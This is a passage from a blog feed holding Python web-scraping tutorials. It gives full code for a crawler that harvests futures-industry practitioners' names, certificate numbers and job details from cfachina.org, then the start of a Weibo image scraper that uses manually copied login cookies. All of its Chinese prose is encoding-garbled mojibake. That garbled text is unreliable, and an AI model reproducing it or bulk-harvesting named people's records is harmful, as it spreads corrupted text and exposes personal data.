<p>è‡³æ­¤ï¼Œçˆ¬è™«çš„ä¸»è¦ä»£ç ä¾¿è®²è§£å®Œäº†ï¼Œä¸‹é¢æ˜¯å®Œæ•´æºç ã€‚</p>
<h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><pre><code class="python">#!/usr/bin/python3
# -*-coding:utf-8-*-

import queue
from threading import Thread

import requests

import re
from bs4 import BeautifulSoup

import os
import platform

import xlwt
from xlrd import open_workbook
from xlutils.copy import copy

import time

# url format â†“
# http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+G01001+&amp;currentPage=1&amp;pageSize=20&amp;selectType=personinfo&amp;all=undefined
# organid: +G01001+, +G01002+, +G01003+, ...
# currentPage: 1, 2, 3, ...
# pageSize: 20(default)
#
# Algorithm design:
# 2 threads with 2 queues
# Thread-1, get first page url, then get page_num and mechanism_name from first page
# Thread-2, parse html file and get data from it, then output data to local file
# url_queue data -&gt; &#39;url&#39;  # first url of each mechanism
# html_queue data -&gt; {&#39;name&#39;:&#39;mechanism_name&#39;, &#39;html&#39;:data}

url_queue = queue.Queue()
html_queue = queue.Queue()


class SpiderThread(Thread):
    &quot;&quot;&quot;Threaded Url Grab&quot;&quot;&quot;
    def __init__(self, url_queue, html_queue):
        Thread.__init__(self)
        self.url_queue = url_queue
        self.html_queue = html_queue
        self.page_size = 20
        self.url_re = re.compile(&#39;#currentPage.*\+.*\+\&#39;(\d+)\&#39;&#39;)
        self.headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&#39;}

    def __get_url(self, mechanism_id, current_page):
        return &#39;http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+%s+&amp;currentPage=%d&amp;pageSize=%d&amp;selectType=personinfo&amp;all=undefined&#39; \
        % (mechanism_id, current_page, self.page_size)

    def grab(self, url):
        &#39;&#39;&#39;Grab html of url from web&#39;&#39;&#39;
        while True:
            try:
                html = requests.get(url, headers=self.headers, timeout=20)
                if html.status_code == 200:
                    break
            except requests.exceptions.ConnectionError as e:
                print(url + &#39; Connection error, try again...&#39;)
            except requests.exceptions.ReadTimeout as e:
                print(url + &#39; Read timeout, try again...&#39;)
            except Exception as e:
                print(str(e))
            finally:
                pass
        return html

    def run(self):
        &#39;&#39;&#39;Grab all htmls of mechanism one by one
        Steps:
            1. grab first page of each mechanism from url_queue
            2. get number of pages and mechanism name from first page
            3. grab all html file of each mechanism
            4. push all html to html_queue
        &#39;&#39;&#39;
        while True:
            mechanism_id = &#39;G0&#39; + self.url_queue.get()

            # the first page&#39;s url
            url = self.__get_url(mechanism_id, 1)
            html = self.grab(url)

            page_cnt = self.url_re.search(html.text).group(1)
            if page_cnt == &#39;0&#39;:
                self.url_queue.task_done()
                continue

            soup = BeautifulSoup(html.text, &#39;html.parser&#39;)
            mechanism_name = soup.find(&#39;&#39;, {&#39;class&#39;:&#39;gst_title&#39;}).find_all(&#39;a&#39;)[2].get_text()
            print(&#39;\nGrab Thread: get %s - %s with %s pages\n&#39; % (mechanism_id, mechanism_name, page_cnt))

            # put data into html_queue
            self.html_queue.put({&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:1, &#39;content&#39;:html})
            for i in range(2, int(page_cnt) + 1):
                url = self.__get_url(mechanism_id, i)
                html = self.grab(url)
                self.html_queue.put({&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:i, &#39;content&#39;:html})

            self.url_queue.task_done()


class DatamineThread(Thread):
    &quot;&quot;&quot;Parse data from html&quot;&quot;&quot;
    def __init__(self, html_queue, filetype):
        Thread.__init__(self)
        self.html_queue = html_queue
        self.filetype = filetype

    def __datamine(self, data):
        &#39;&#39;&#39;Get data from html content&#39;&#39;&#39;
        soup = BeautifulSoup(data[&#39;content&#39;].text, &#39;html.parser&#39;)
        infos = []
        for info in soup.find_all(&#39;tr&#39;, id=True):
            items = []
            for item in info.find_all(&#39;td&#39;):
                items.append(item.get_text())
            infos.append(items)
        return infos

    def run(self):
        while True:
            data = self.html_queue.get()
            print(&#39;Datamine Thread: get %s_%d&#39; % (data[&#39;name&#39;], data[&#39;num&#39;]))

            store = Storage(data[&#39;name&#39;], self.filetype)
            store.save(self.__datamine(data))
            self.html_queue.task_done()


class Storage():
    def __init__(self, filename, filetype):
        self.filetype = filetype
        self.filename = filename + filetype
        self.table_header = (&#39;å§“å&#39;, &#39;æ€§åˆ«&#39;, &#39;ä»ä¸šèµ„æ ¼å·&#39;, &#39;æŠ•èµ„å’¨è¯¢ä»ä¸šè¯ä¹¦å·&#39;, &#39;ä»»èŒéƒ¨é—¨&#39;, &#39;èŒåŠ¡&#39;, &#39;ä»»ç°èŒæ—¶é—´&#39;)
        self.path = self.__get_path()

    def __get_path(self):
        path = {
            &#39;Windows&#39;: &#39;D:/litreily/Documents/python/cfachina&#39;,
            &#39;Linux&#39;: &#39;/mnt/d/litreily/Documents/python/cfachina&#39;
        }.get(platform.system())

        if not os.path.isdir(path):
            os.makedirs(path)
        return &#39;%s/%s&#39; % (path, self.filename)

    def write_txt(self, data):
        &#39;&#39;&#39;Write data to txt file&#39;&#39;&#39;
        fid = open(self.path, &#39;a&#39;, encoding=&#39;utf-8&#39;)

        # insert the header of table
        if not os.path.getsize(self.path):
            fid.write(&#39;\t&#39;.join(self.table_header) + &#39;\n&#39;)

        for info in data:
            fid.write(&#39;\t&#39;.join(info) + &#39;\n&#39;)
        fid.close()

    def write_excel(self, data):
        &#39;&#39;&#39;write data to excel file&#39;&#39;&#39;
        if not os.path.exists(self.path):
            header_style = xlwt.easyxf(&#39;font:name æ¥·ä½“, color-index black, bold on&#39;)
            wb = xlwt.Workbook(encoding=&#39;utf-8&#39;)
            ws = wb.add_sheet(&#39;Data&#39;)

            # insert the header of table
            for i in range(len(self.table_header)):
                ws.write(0, i, self.table_header[i], header_style)
        else:
            rb = open_workbook(self.path)
            wb = copy(rb)
            ws = wb.get_sheet(0)

        # write data
        offset = len(ws.rows)
        for i in range(0, len(data)):
            for j in range(0, len(data[0])):
                ws.write(offset + i, j, data[i][j])

        # When use xlutils.copy.copy function to copy data from exist .xls file,
        # it will loss the origin style, so we need overwrite the width of column,
        # maybe there some other good solution, but I have not found yet.
        for i in range(len(self.table_header)):
            ws.col(i).width = 256 * (10, 10, 15, 20, 50, 20, 15)[i]

        # save to file
        while True:
            try:
                wb.save(self.path)
                break
            except PermissionError as e:
                print(&#39;{0} error: {1}&#39;.format(self.path, e.strerror))
                time.sleep(5)
            finally:
                pass

    def save(self, data):
        &#39;&#39;&#39;Write data to local file.

        According filetype to choose function to save data, filetype can be &#39;.txt&#39;
        or &#39;.xls&#39;, but &#39;.txt&#39; type is saved more faster then &#39;.xls&#39; type

        Args:
            data: a 2d-list array that need be save
        &#39;&#39;&#39;
        {
            &#39;.txt&#39;: self.write_txt,
            &#39;.xls&#39;: self.write_excel
        }.get(self.filetype)(data)


def main():
    for i in range(1001, 1199):
        url_queue.put(str(i))

    # create and start a spider thread
    st = SpiderThread(url_queue, html_queue)
    st.setDaemon(True)
    st.start()

    # create and start a datamine thread
    dt = DatamineThread(html_queue, &#39;.xls&#39;)
    dt.setDaemon(True)
    dt.start()

    # wait on the queue until everything has been processed
    url_queue.join()
    html_queue.join()


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<h2 id="çˆ¬å–æµ‹è¯•"><a href="#çˆ¬å–æµ‹è¯•" class="headerlink" title="çˆ¬å–æµ‹è¯•"></a>çˆ¬å–æµ‹è¯•</h2><p><img src="/assets/spider/cfachina/spider.png" alt="spider"></p>
<p><img src="/assets/spider/cfachina/save_txt.png" alt="save to txt"></p>
<p><img src="/assets/spider/cfachina/save_xls.png" alt="save to excel"></p>
<h2 id="å†™åœ¨æœ€å"><a href="#å†™åœ¨æœ€å" class="headerlink" title="å†™åœ¨æœ€å"></a>å†™åœ¨æœ€å</h2><ul>
<li>æµ‹è¯•å‘ç°ï¼Œå†™å…¥<code>txt</code>çš„é€Ÿåº¦æ˜æ˜¾é«˜äºå†™å…¥<code>excel</code>çš„é€Ÿåº¦</li>
<li>å¦‚æœå°†é¡µé¢ç½‘å€ä¸­çš„<code>pageSize</code>ä¿®æ”¹ä¸º<code>1000</code>æˆ–æ›´å¤§ï¼Œåˆ™å¯ä»¥ä¸€æ¬¡æ€§è·å–æŸæœºæ„çš„æ‰€æœ‰ä»ä¸šäººå‘˜ä¿¡æ¯ï¼Œè€Œä¸ç”¨é€é¡µçˆ¬å–ï¼Œæ•ˆç‡å¯ä»¥å¤§å¤§æé«˜ã€‚</li>
<li>è¯¥çˆ¬è™«å·²æ‰˜ç®¡è‡³<a href="https://github.com/Litreily/Python-demos" target="_blank" rel="noopener">github Python-demos</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
            <tag> queue </tag>
            
            <tag> xlwt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonç½‘ç»œçˆ¬è™«2 - çˆ¬å–æ–°æµªå¾®åšç”¨æˆ·å›¾ç‰‡]]></title>
      <url>https://www.litreily.top/2018/04/10/sina/</url>
      <content type="html"><![CDATA[<p>å…¶å®ï¼Œæ–°æµªå¾®åšç”¨æˆ·å›¾ç‰‡çˆ¬è™«æ˜¯æˆ‘å­¦ä¹ <code>python</code>ä»¥æ¥å†™çš„ç¬¬ä¸€ä¸ªçˆ¬è™«ï¼Œåªä¸è¿‡å½“æ—¶æ‡’ï¼Œåæ¥çˆ¬å®Œ<code>Lofter</code>åè§‰å¾—æœ‰å¿…è¦æ€»ç»“ä¸€ä¸‹ï¼Œæ‰€ä»¥å°±æœ‰äº†ç¬¬ä¸€ç¯‡çˆ¬è™«åšå®¢ã€‚ç°åœ¨æš‚æ—¶é—²ä¸‹æ¥äº†ï¼Œå‡†å¤‡æŠŠæ–°æµªçš„è¿™ä¸ªä¹Ÿè¡¥ä¸Šã€‚</p>
<p>è¨€å½’æ­£ä¼ ï¼Œæ—¢ç„¶é€‰æ‹©çˆ¬æ–°æµªå¾®åšï¼Œé‚£å½“ç„¶æ˜¯æœ‰éœ€æ±‚çš„ï¼Œè¿™ä¹Ÿæ˜¯å­¦ä¹ çš„ä¸»è¦åŠ¨åŠ›ä¹‹ä¸€ï¼Œæ²¡é”™ï¼Œå°±æ˜¯ç¾å›¾ã€‚<code>sina</code>ç”¨æˆ·å¤šæ•°å¾®åšéƒ½æ˜¯åŒ…å«å›¾ç‰‡çš„ï¼Œè€Œä¸”æ˜¯ç»„å›¾å±…å¤šï¼Œå•ä¸ªå›¾ç‰‡çš„è¾ƒå°‘ã€‚</p>
<p>ä¸ºäº†é¿å…ä¾µæƒï¼Œæœ¬æ–‡ä»¥æœ¬äººå¾®åš<a href="https://weibo.com/litreily" target="_blank" rel="noopener">litreily</a>ä¸ºä¾‹è¯´æ˜æ•´ä¸ªçˆ¬å–è¿‡ç¨‹ï¼Œè™½ç„¶å›¾ç‰‡è¾ƒå°‘ï¼Œè´¨é‡è¾ƒä½ï¼Œä½†çˆ¬å–æ–¹æ¡ˆæ˜¯ç»å¯¹okçš„ï¼Œä½¿ç”¨æ—¶åªè¦æ¢ä¸ªç”¨æˆ·IDå°±å¯ä»¥äº†ã€‚</p>
<h2 id="åˆ†æsinaç«™ç‚¹"><a href="#åˆ†æsinaç«™ç‚¹" class="headerlink" title="åˆ†æsinaç«™ç‚¹"></a>åˆ†æsinaç«™ç‚¹</h2><h3 id="è·å–ç”¨æˆ·ID"><a href="#è·å–ç”¨æˆ·ID" class="headerlink" title="è·å–ç”¨æˆ·ID"></a>è·å–ç”¨æˆ·ID</h3><p>åœ¨çˆ¬å–å‰ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªç”¨æˆ·åï¼Œè€Œä¸€ä¸ªç”¨æˆ·ååˆå¯¹åº”ä¸€ä¸ªå”¯ä¸€çš„æ•´å‹æ•°å­—IDï¼Œç±»ä¼¼äºå­¦ç”Ÿçš„å­¦å·ï¼Œæœ¬äººçš„æ˜¯<code>2657006573</code>ã€‚è‡³äºæ€ä¹ˆæ ¹æ®ç”¨æˆ·åå»è·å–IDï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p>
<ol>
<li>è¿›å…¥å¾…çˆ¬å–ç”¨æˆ·ä¸»é¡µï¼Œåœ¨æµè§ˆå™¨ç½‘å€æ ä¸­å³å¯çœ‹åˆ°ä¸€ä¸²æ•°æ®ï¼Œé‚£å°±æ˜¯ç”¨æˆ·ID</li>
<li><code>Ctrl-U</code>æŸ¥çœ‹å¾…çˆ¬å–ç”¨æˆ·çš„æºç ï¼Œæœç´¢<code>&quot;uid</code>ï¼Œæ³¨æ„æ˜¯<strong>åŒå¼•å·</strong></li>
</ol>
<p>å…¶å®æ˜¯å¯ä»¥åœ¨å·²çŸ¥ç”¨æˆ·åçš„æƒ…å†µä¸‹é€šè¿‡çˆ¬è™«è‡ªåŠ¨è·å–åˆ°<code>uid</code>çš„ï¼Œä½†æ˜¯æˆ‘å½“æ—¶åˆå­¦<code>python</code>ï¼Œå¹¶æ²¡æœ‰è€ƒè™‘å……åˆ†ï¼Œæ‰€ä»¥åé¢çš„æºç æ˜¯ä»¥ç”¨æˆ·IDä½œä¸ºè¾“å…¥å‚æ•°çš„ã€‚</p>
<h3 id="å›¾ç‰‡å­˜å‚¨å‚æ•°è§£æ"><a href="#å›¾ç‰‡å­˜å‚¨å‚æ•°è§£æ" class="headerlink" title="å›¾ç‰‡å­˜å‚¨å‚æ•°è§£æ"></a>å›¾ç‰‡å­˜å‚¨å‚æ•°è§£æ</h3><p>ç”¨æˆ·æ‰€æœ‰çš„å›¾ç‰‡éƒ½è¢«å­˜æ”¾è‡³è¿™æ ·çš„è·¯å¾„ä¸‹ï¼ŒçœŸçš„æ˜¯<strong>æ‰€æœ‰å›¾ç‰‡</strong>å“¦ï¼ï¼ï¼</p>
<pre><code class="yml">https://weibo.cn/{uid}/profile?filter={filter_type}&amp;page={page_num}

# example
https://weibo.cn/2657006573/profile?filter=0&amp;page=1
uid: 2657006573
filter_type: 0
page_num: 1
</code></pre>
<p>æ³¨æ„ï¼Œæ˜¯<code>weibo.cn</code>è€Œä¸æ˜¯<code>weibo.com</code>ï¼Œè‡³äºæˆ‘æ˜¯æ€ä¹ˆæ‰¾åˆ°è¿™ä¸ªé¡µé¢çš„ï¼Œè¯´å®è¯ï¼Œæˆ‘ä¹Ÿå¿˜äº†ã€‚ã€‚ã€‚</p>
<p>é“¾æ¥ä¸­åŒ…å«3ä¸ªå‚æ•°ï¼Œ<code>uid</code>, <code>filter_mode</code> ä»¥åŠ <code>page_num</code>ã€‚å…¶ä¸­ï¼Œ<code>uid</code>å°±æ˜¯å‰é¢æåŠçš„ç”¨æˆ·IDï¼Œ<code>page_num</code>ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯åˆ†é¡µçš„å½“å‰é¡µæ•°ï¼Œä»1å¼€å§‹å¢åŠ ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ª<code>filter_mode</code>æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>ä¸ç€æ€¥ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹é¡µé¢â†“</p>
<p><img src="/assets/spider/sina/filter_mode.png" alt="filter mode of pictures"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæ»¤æ³¢ç±»å‹<code>filter_mode</code>æŒ‡çš„å°±æ˜¯ç­›é€‰æ¡ä»¶ï¼Œä¸€å…±ä¸‰ä¸ªï¼š</p>
<ol>
<li>filter=0 å…¨éƒ¨å¾®åšï¼ˆåŒ…å«çº¯æ–‡æœ¬å¾®åšï¼Œè½¬è½½å¾®åšï¼‰</li>
<li>filter=1 åŸåˆ›å¾®åšï¼ˆåŒ…å«çº¯æ–‡æœ¬å¾®åšï¼‰</li>
<li>filter=2 å›¾ç‰‡å¾®åšï¼ˆå¿…é¡»å«æœ‰å›¾ç‰‡ï¼ŒåŒ…å«è½¬è½½ï¼‰</li>
</ol>
<p>æˆ‘é€šå¸¸ä¼šé€‰æ‹©<strong>åŸåˆ›</strong>ï¼Œå› ä¸ºæˆ‘å¹¶ä¸å¸Œæœ›çˆ¬å–ç»“æœä¸­åŒ…å«è½¬è½½å¾®åšä¸­çš„å›¾ç‰‡ã€‚å½“ç„¶ï¼Œå¤§å®¶ä¾ç…§è‡ªå·±çš„éœ€è¦é€‰æ‹©å³å¯ã€‚</p>
<h3 id="å›¾é“¾è§£æ"><a href="#å›¾é“¾è§£æ" class="headerlink" title="å›¾é“¾è§£æ"></a>å›¾é“¾è§£æ</h3><p>å¥½äº†ï¼Œå‚æ•°æ¥æºéƒ½çŸ¥é“äº†ï¼Œæˆ‘ä»¬å›è¿‡å¤´çœ‹çœ‹è¿™ä¸ªç½‘é¡µã€‚é¡µé¢æ˜¯ä¸æ˜¯æ„Ÿè§‰å°±æ˜¯ä¸ªç©ºæ¶å­ï¼Ÿæ¯«æ— cssç—•è¿¹ï¼Œæ²¡å…³ç³»ï¼Œæ–°æµªæœ¬æ¥å°±æ²¡æ‰“ç®—æŠŠè¿™ä¸ªé¡µé¢ä¸»åŠ¨å‘ˆç°ç»™ç”¨æˆ·ã€‚ä½†å¯¹äºçˆ¬è™«è€Œè¨€ï¼Œè¿™å´æ˜¯æå¥½çš„ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼ŸåŸå› å¦‚ä¸‹ï¼š</p>
<ol>
<li>å›¾ç‰‡é½å…¨ï¼Œæ²¡æœ‰é—æ¼ï¼Œå°±æ˜¯ä¸ªå¯è§†åŒ–çš„æ•°æ®åº“</li>
<li>æ ·å¼å°‘ï¼Œé¡µé¢ç®€å•ï¼Œçœæµé‡ï¼Œçˆ¬å–å¿«</li>
<li>é™æ€ç½‘é¡µï¼Œåˆ†é¡µå­˜å‚¨ï¼Œæ‰€è§å³æ‰€å¾—</li>
<li>æºç åŒ…å«äº†æ‰€æœ‰å¾®åšçš„<strong>é¦–å›¾</strong>å’Œ<strong>ç»„å›¾é“¾æ¥</strong></li>
</ol>
<p>è¿™æ ·çš„ç½‘é¡µç”¨æ¥ç»ƒæ‰‹å†åˆé€‚ä¸è¿‡ã€‚ä½†è¦æ³¨æ„çš„æ˜¯ä¸Šé¢ç¬¬4ç‚¹ï¼Œä»€ä¹ˆæ˜¯<strong>é¦–å›¾</strong>å’Œ<strong>ç»„å›¾é“¾æ¥</strong>å‘¢ï¼Œå¾ˆå¥½ç†è§£ã€‚æ¯ç¯‡åšå®¢å¯èƒ½åŒ…å«å¤šå¼ å›¾ç‰‡ï¼Œé‚£å°±æ˜¯<strong>ç»„å›¾</strong>ï¼Œä½†è¯¥é¡µé¢åªæ˜¾ç¤ºåšå®¢çš„ç¬¬ä¸€å¼ å›¾ç‰‡ï¼Œå³æ‰€è°“çš„<strong>é¦–å›¾</strong>ï¼Œ<strong>ç»„å›¾é“¾æ¥</strong>æŒ‡å‘çš„æ˜¯å­˜å‚¨ç€è¯¥ç»„å›¾æ‰€æœ‰å›¾ç‰‡çš„ç½‘å€ã€‚</p>
<p>ç”±äºæœ¬äººå¾®åšæ²¡ç»„å›¾ï¼Œæ‰€ä»¥æ­¤å¤„ä»¥åˆ˜äº¦è²å¾®åšä¸ºä¾‹ï¼Œè¯´æ˜å•å›¾åŠç»„å›¾çš„å›¾é“¾æ ¼å¼</p>
<p><img src="/assets/spider/sina/pictures.png" alt="pictures"></p>
<p>å›¾ä¸­çš„ä¸Šé¢ä¸€ç¯‡å¾®åšåªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œå¯ä»¥è½»æ˜“è·å–åˆ°åŸå›¾é“¾æ¥ï¼Œæ³¨æ„æ˜¯<strong>åŸå›¾</strong>ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨é¡µé¢èƒ½çœ‹åˆ°çš„æ˜¯ç¼©ç•¥å›¾ï¼Œä½†è¦çˆ¬å–çš„å½“ç„¶æ˜¯<strong>åŸå›¾</strong>å•¦ã€‚</p>
<p>å›¾ä¸­ä¸‹é¢çš„å¾®åšåŒ…å«ç»„å›¾ï¼Œåœ¨å›¾ç‰‡å³ä¾§çš„<code>Chrome</code>å¼€å‘å·¥å…·å¯ä»¥çœ‹åˆ°ç»„å›¾é“¾æ¥ã€‚</p>
<p><a href="https://weibo.cn/mblog/picAll/FCQefgeAr?rl=2" target="_blank" rel="noopener">https://weibo.cn/mblog/picAll/FCQefgeAr?rl=2</a></p>
<p>æ‰“å¼€ç»„å›¾é“¾æ¥ï¼Œå¯ä»¥çœ‹åˆ°å›¾ç‰‡å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/assets/spider/sina/picture_url.png" alt="picture&#39;s url"></p>
<p>å¯ä»¥çœ‹åˆ°ç¼©ç•¥å›¾é“¾æ¥ä»¥åŠåŸå›¾é“¾æ¥ï¼Œç„¶åæˆ‘ä»¬ç‚¹å‡»<strong>åŸå›¾</strong>çœ‹ä¸€ä¸‹ã€‚</p>
<p><img src="/assets/spider/sina/picture_source.png" alt="picture&#39;s origin url"></p>
<p>å¯ä»¥å‘ç°ï¼Œå¼¹å‡ºé¡µé¢çš„é“¾æ¥ä¸ä¸Šå›¾æ˜¾ç¤ºçš„ä¸åŒï¼Œä½†ä¸ä¸Šå›¾ä¸­çš„ç¼©ç•¥å›¾é“¾æ¥æä¸ºç›¸ä¼¼ã€‚å®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p>
<ol>
<li>ç¼©ç•¥å›¾ï¼š<a href="http://ww1.sinaimg.cn/thumb180/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg" target="_blank" rel="noopener">http://ww1.sinaimg.cn/thumb180/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg</a></li>
<li>åŸå›¾ï¼š<a href="http://wx1.sinaimg.cn/large/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg" target="_blank" rel="noopener">http://wx1.sinaimg.cn/large/c260f7ably1fn4vd7ix0qj20rs1aj1kx.jpg</a></li>
</ol>
<p>å¯ä»¥çœ‹å‡ºï¼Œåªæ˜¯ä¸€ä¸ª<code>thumb180</code>å’Œ<code>large</code>çš„åŒºåˆ«ã€‚æ—¢ç„¶å‘ç°äº†è§„å¾‹ï¼Œé‚£å°±å¥½åŠå¤šäº†ï¼Œæˆ‘ä»¬åªè¦çŸ¥é“ç¼©ç•¥å›¾çš„ç½‘å€ï¼Œå°±å¯ä»¥å°†åŸŸååçš„ç¬¬ä¸€çº§å­åŸŸåæ›¿æ¢æˆ<code>large</code>å°±å¯ä»¥äº†ï¼Œè€Œä¸ç”¨è·å–<strong>åŸå›¾</strong>é“¾æ¥å†è·³è½¬ä¸€æ¬¡ã€‚</p>
<p>è€Œä¸”ï¼Œå¤šæ¬¡å°è¯•å¯ä»¥å‘ç°ç»„å›¾é“¾æ¥åŠç¼©ç•¥å›¾é“¾æ¥æ»¡è¶³æ­£åˆ™è¡¨è¾¾å¼ï¼š</p>
<pre><code class="python"># 1. ç»„å›¾é“¾æ¥ï¼š
imglist_reg = r&#39;href=&quot;(https://weibo.cn/mblog/picAll/.{9}\?rl=2)&quot;&#39;

# 2. ç¼©ç•¥å›¾
img_reg = r&#39;src=&quot;(http://w.{2}\.sinaimg.cn/(.{6,8})/.{32,33}.(jpg|gif))&quot;&#39;
</code></pre>
<p>åˆ°æ­¤ï¼Œæ–°æµªå¾®åšçš„è§£æè¿‡ç¨‹å°±ç»“æŸäº†ï¼Œå›¾é“¾çš„æ ¼å¼ä»¥åŠè·å–æ–¹å¼ä¹Ÿéƒ½æ¸…æ¥šäº†ã€‚ä¸‹é¢å°±å¯ä»¥è®¾è®¡æ–¹æ¡ˆè¿›è¡Œçˆ¬å–äº†ã€‚</p>
<h2 id="ç¡®å®šçˆ¬å–æ–¹æ¡ˆ"><a href="#ç¡®å®šçˆ¬å–æ–¹æ¡ˆ" class="headerlink" title="ç¡®å®šçˆ¬å–æ–¹æ¡ˆ"></a>ç¡®å®šçˆ¬å–æ–¹æ¡ˆ</h2><p>æ ¹æ®è§£æç»“æœï¼Œå¾ˆå®¹æ˜“åˆ¶å®šå‡ºä»¥ä¸‹çˆ¬å–æ–¹æ¡ˆï¼š</p>
<ol>
<li>ç»™å®šå¾®åšç”¨æˆ·å<code>litreily</code></li>
<li>è¿›å…¥å¾…çˆ¬å–ç”¨æˆ·ä¸»é¡µï¼Œå³å¯ä»ç½‘å€ä¸­è·å–<code>uid: 2657006573</code></li>
<li>è·å–æœ¬äººç™»å½•å¾®åšåçš„<code>cookies</code>ï¼ˆè¯·æ±‚æŠ¥æ–‡éœ€è¦ç”¨åˆ°<code>cookies</code>ï¼‰</li>
<li>é€ä¸€çˆ¬å–<a href="https://weibo.cn/2657006573/profile?filter=0&amp;page={1,2,3,...}" target="_blank" rel="noopener">https://weibo.cn/2657006573/profile?filter=0&amp;page={1,2,3,...}</a></li>
<li>è§£ææ¯ä¸€é¡µçš„æºç ï¼Œè·å–å•å›¾é“¾æ¥åŠç»„å›¾é“¾æ¥ï¼Œ<ul>
<li>å•å›¾ï¼šç›´æ¥è·å–è¯¥å›¾ç¼©ç•¥å›¾é“¾æ¥ï¼›</li>
<li>ç»„å›¾ï¼šçˆ¬å–ç»„å›¾é“¾æ¥ï¼Œå¾ªç¯è·å–ç»„å›¾é¡µé¢æ‰€æœ‰å›¾ç‰‡çš„ç¼©ç•¥å›¾é“¾æ¥</li>
</ul>
</li>
<li>å¾ªç¯å°†ç¬¬5æ­¥è·å–åˆ°çš„å›¾é“¾æ›¿æ¢ä¸ºåŸå›¾é“¾æ¥ï¼Œå¹¶ä¸‹è½½è‡³æœ¬åœ°</li>
<li>é‡å¤ç¬¬4-6æ­¥ï¼Œç›´è‡³æ²¡æœ‰å›¾ç‰‡</li>
</ol>
<h3 id="è·å–cookies"><a href="#è·å–cookies" class="headerlink" title="è·å–cookies"></a>è·å–cookies</h3><p>é’ˆå¯¹ä»¥ä¸Šæ–¹æ¡ˆï¼Œå…¶ä¸­æœ‰å‡ ä¸ªé‡ç‚¹å†…å®¹ï¼Œå…¶ä¸€å°±æ˜¯<code>cookies</code>çš„è·å–ï¼Œæˆ‘æš‚æ—¶è¿˜æ²¡å­¦æ€ä¹ˆè‡ªåŠ¨è·å–<code>cookies</code>ï¼Œæ‰€ä»¥ç›®å‰æ˜¯ç™»å½•å¾®åšåæ‰‹åŠ¨è·å–çš„ã€‚</p>
<p><img src="/assets/spider/sina/cookies.png" alt="get cookies"></p>
<h3 id="ä¸‹è½½ç½‘é¡µ"><a href="#ä¸‹è½½ç½‘é¡µ" class="headerlink" title="ä¸‹è½½ç½‘é¡µ"></a>ä¸‹è½½ç½‘é¡µ</h3><p>ä¸‹è½½ç½‘é¡µç”¨çš„æ˜¯<code>python3</code>è‡ªå¸¦çš„<code>urllib</code>åº“ï¼Œå½“æ—¶æ²¡å­¦<code>requests</code>ï¼Œä»¥åå¯èƒ½ä¹Ÿå¾ˆå°‘ç”¨<code>urllib</code>äº†ã€‚</p>
<pre><code class="python">def _get_html(url, headers):
    try:
        req = urllib.request.Request(url, headers = headers)
        page = urllib.request.urlopen(req)
        html = page.read().decode(&#39;UTF-8&#39;)
    except Exception as e:
        print(&quot;get %s failed&quot; % url)
        return None
    return html
</code></pre>
<h3 id="è·å–å­˜å‚¨è·¯å¾„"><a href="#è·å–å­˜å‚¨è·¯å¾„" class="headerlink" title="è·å–å­˜å‚¨è·¯å¾„"></a>è·å–å­˜å‚¨è·¯å¾„</h3><p>ç”±äºæˆ‘æ˜¯åœ¨<code>win10</code>ä¸‹ç¼–å†™çš„ä»£ç ï¼Œä½†æ˜¯ä¸ªäººæ¯”è¾ƒå–œæ¬¢ç”¨<code>bash</code>ï¼Œæ‰€ä»¥å›¾ç‰‡çš„å­˜å‚¨è·¯å¾„æœ‰ä»¥ä¸‹ä¸¤ç§æ ¼å¼ï¼Œ<code>_get_path</code>å‡½æ•°ä¼šè‡ªåŠ¨åˆ¤æ–­å½“å‰æ“ä½œç³»ç»Ÿçš„ç±»å‹ï¼Œç„¶åé€‰æ‹©ç›¸åº”çš„è·¯å¾„ã€‚</p>
<pre><code class="python">def _get_path(uid):
    path = {
        &#39;Windows&#39;: &#39;D:/litreily/Pictures/python/sina/&#39; + uid,
        &#39;Linux&#39;: &#39;/mnt/d/litreily/Pictures/python/sina/&#39; + uid
    }.get(platform.system())

    if not os.path.isdir(path):
        os.makedirs(path)
    return path
</code></pre>
<p>å¹¸å¥½<code>windows</code>æ˜¯å…¼å®¹<code>linux</code>ç³»ç»Ÿçš„æ–œæ ç¬¦å·çš„ï¼Œä¸ç„¶ç¨‹åºä¸­çš„ç›¸å¯¹è·¯å¾„æ›¿æ¢è¿˜æŒºéº»çƒ¦ã€‚</p>
<h3 id="ä¸‹è½½å›¾ç‰‡"><a href="#ä¸‹è½½å›¾ç‰‡" class="headerlink" title="ä¸‹è½½å›¾ç‰‡"></a>ä¸‹è½½å›¾ç‰‡</h3><p>ç”±äºé€‰ç”¨çš„<code>urllib</code>åº“ï¼Œæ‰€ä»¥ä¸‹è½½å›¾ç‰‡å°±ä½¿ç”¨<code>urllib.request.urlretrieve</code>äº†</p>
<pre><code class="python"># image url of one page is saved in imgurls
for img in imgurls:
